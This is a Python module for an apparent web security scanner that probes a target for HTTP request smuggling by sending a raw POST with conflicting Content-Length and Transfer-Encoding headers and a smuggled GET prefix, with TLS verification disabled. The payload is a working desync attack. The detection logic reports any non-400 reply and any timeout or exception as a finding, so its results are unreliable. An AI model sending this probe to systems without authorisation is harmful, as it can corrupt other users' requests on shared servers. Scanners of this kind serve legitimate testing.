"""HTTP Request Smuggling detection — CL/TE desync probe."""

import socket
import ssl
from webbreach.engines import BaseEngine
from webbreach.findings import Finding, Severity


class SmugglingEngine(BaseEngine):
    name = "smuggling"
    description = "HTTP Request Smuggling (CL/TE) detector"

    def _scan(self) -> list[Finding]:
        findings: list[Finding] = []
        url = f"{self.target_url}/smuggle"

        # Parse target URL
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        # CL/TE mismatch payload
        body = b"0\r\n\r\nSMUGGLE_MARKER_x4a GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
        cl = str(len(body)).encode()

        raw = (
            b"POST /smuggle HTTP/1.1\r\n"
            b"Host: " + host.encode() + b":" + str(port).encode() + b"\r\n"
            b"Content-Length: " + cl + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n" + body
        )

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            if parsed.scheme == "https":
                sock = socket.create_connection((host, port), timeout=self.timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=host)
                ssock.sendall(raw)
                resp = ssock.recv(4096).decode(errors="replace")
                ssock.close()
            else:
                sock = socket.create_connection((host, port), timeout=self.timeout)
                sock.sendall(raw)
                resp = sock.recv(4096).decode(errors="replace")
                sock.close()

            # If server didn't reject with 400, it may be vulnerable
            status_line = resp.split("\r\n")[0] if resp else ""
            if "400" not in status_line:
                findings.append(self._finding(
                    severity=Severity.HIGH,
                    title="HTTP Request Smuggling — CL/TE mismatch accepted",
                    method="POST",
                    evidence=f"Response: {resp[:200]}",
                    payload="CL/TE mismatch",
                ))
        except Exception as e:
            # Timeout or connection issues still indicate potential vulnerability
            findings.append(self._finding(
                severity=Severity.MEDIUM,
                title="HTTP Request Smuggling — CL/TE probe (timeout/connection)",
                method="POST",
                evidence=f"Exception: {e}",
                payload="CL/TE mismatch",
            ))

        return findings
